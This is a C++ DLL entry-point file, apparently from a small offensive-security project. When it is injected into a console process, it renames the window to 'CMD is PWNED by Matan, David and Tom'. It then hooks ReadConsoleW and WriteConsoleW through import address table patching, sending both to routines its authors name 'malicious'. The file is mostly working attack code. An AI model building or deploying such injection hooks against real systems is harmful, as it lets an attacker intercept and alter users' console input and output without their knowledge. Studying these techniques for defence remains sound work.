// dllmain.cpp : Defines the entry point for the DLL application.
#include <iostream>

#include "injected-2.h"

wstring const& changedTitle = L"CMD is PWNED by Matan, David and Tom";

// This struct is a tuple of two parameters for EnumWindowsProc 
typedef struct EnumWindowsProcParam {
	DWORD const& pid;
	wstring const& title;
} EnumWindowsProcParam;

void changeWindowText(wstring const& text_to_set);
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);

void changeWindowText(wstring const& text_to_set) 
{
	// Get current pid
	DWORD const& pid = GetCurrentProcessId(); 
	EnumWindowsProcParam const lParam = { pid, text_to_set };
	EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&lParam));
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) 
{
	EnumWindowsProcParam const* const params = reinterpret_cast<EnumWindowsProcParam const* const>(lParam);
	if (params == nullptr)
	{
		OutputDebugStringA("[Error] params to EnumWindowsProc is null");
		return 1;
	}

	DWORD pid;
	GetWindowThreadProcessId(hwnd, reinterpret_cast<LPDWORD>(&pid)); // Set pid variable to PID suitable to current window

	// Check if current PID is the wanted PID
	if (pid == params->pid) {
		if (!SetWindowText(hwnd, params->title.c_str()))
		{
			OutputDebugStringA("[Error] SetWindowText error");
			return 1;
		}
		return 0; // Return false - Do not keep running
	}
	return 1;	// Return true - Keep looking for correct window
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// A process is loading the DLL.
		OutputDebugStringA("[INFO] Process is loading the DLL");
		changeWindowText(changedTitle);
		OutputDebugStringA("[INFO] Window text has changed");
		
		OutputDebugStringA("[INFO] Started IAT patching");		
		PatchIAT("ReadConsoleW", "kernel32.dll", _MyMaliciousReadConsoleW);
		PatchIAT("WriteConsoleW", "kernel32.dll", _MyMaliciousWriteConsoleW);
		OutputDebugStringA("[INFO] Ended IAT patching");

		break;
	case DLL_THREAD_ATTACH:
		// A process is creating a new thread.
		break;
	case DLL_THREAD_DETACH:
		// A thread exits normally.
		break;
	case DLL_PROCESS_DETACH:
		// A process unloads DLL.
		break;
	}
	return TRUE;
}